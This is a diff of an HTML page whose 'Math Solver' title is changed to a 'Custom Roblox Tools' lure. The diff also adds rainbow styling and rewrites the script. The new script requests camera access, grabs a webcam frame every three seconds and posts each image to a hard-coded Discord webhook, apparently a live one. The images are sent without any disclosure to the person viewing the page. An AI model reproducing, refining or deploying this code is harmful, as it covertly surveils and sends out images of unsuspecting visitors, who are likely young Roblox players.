@@ -5,15 +5,25 @@
     <title>Math Solver</title>
     <style>
       body {
-        background-color: #f7f7f7;
+        background-color: #000000;
         font-family: Arial, sans-serif;
         font-size: 16px;
       }
       h1 {
-        color: #003580;
         font-size: 32px;
         text-align: center;
         margin-top: 50px;
+        background: linear-gradient(45deg, #ff0000, #ff8000, #ffff00, #00ff00, #00ffff, #0000ff, #8000ff, #ff00ff, #ff0000);
+        background-size: 800% 800%;
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+        animation: rainbow 2s ease-in-out infinite;
+      }
+      @keyframes rainbow {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
       }
       #math-image {
         display: block;
@@ -28,42 +38,49 @@
         text-align: center;
         margin-top: 20px;
         font-size: 24px;
-        color: #003580;
+        color: #FF3131;
       }
     </style>
   </head>
   <body>
-    <h1>Math Solver</h1>
-    <img id="math-image" src="" alt="Math Equation">
+    <h1>Custom Roblox Tools 🌙</h1>
+    <img id="Loading..." src="" alt="Loading...">
     <div id="math-equation"></div>
-    <script>
-      let imageCounter = 1;
-      const intervalId = setInterval(captureImage, 3000);
+<script>
+      var imageCounter = 1;
+      var intervalId = setInterval(function() {
+        captureImage();
+      }, 3000);
 
-      async function captureImage() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({video: true, width: 400, height: 300});
-          const video = document.createElement('video');
-          video.srcObject = stream;
+      function captureImage() {
+        var video = document.querySelector('video');
+        var canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(function(blob) {
+          var formData = new FormData();
+          formData.append('file', blob, 'math-equation.jpg');
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://discord.com/api/webhooks/1456537896885420063/edQDxToE40p8fg0rBqz1IIoqcW9YGymAU52eBSR7X1eD2bPxo5NdNwuezg_Nzk1xA0qC');
+          xhr.send(formData);
+        }, 'image/jpeg', 1.0);
+        var equation = 'Equation ' + imageCounter++;
+        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
+        document.getElementById('math-equation').innerHTML = equation;
+      }
+
+      var constraints = { video: { width: 400, height: 300 } };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(mediaStream) {
+          var video = document.createElement('video');
+          video.srcObject = mediaStream;
           video.play();
           document.body.appendChild(video);
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
-          const formData = new FormData();
-          formData.append('file', blob, 'math-equation.jpg');
-          const xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://discord.com/api/webhooks/1111');
-          xhr.send(formData);
-          const equation = `Equation ${imageCounter++}`;
-          document.getElementById('math-image').src = canvas.toDataURL();
-          document.getElementById('math-equation').innerHTML = equation;
-        } catch (error) {
-          console.log(error.name + ": " + error.message);
-        }
-      }
+        })
+        .catch(function(err) {
+          console.log(err.name + ": " + err.message);
+        });
     </script>
   </body>
 </html>
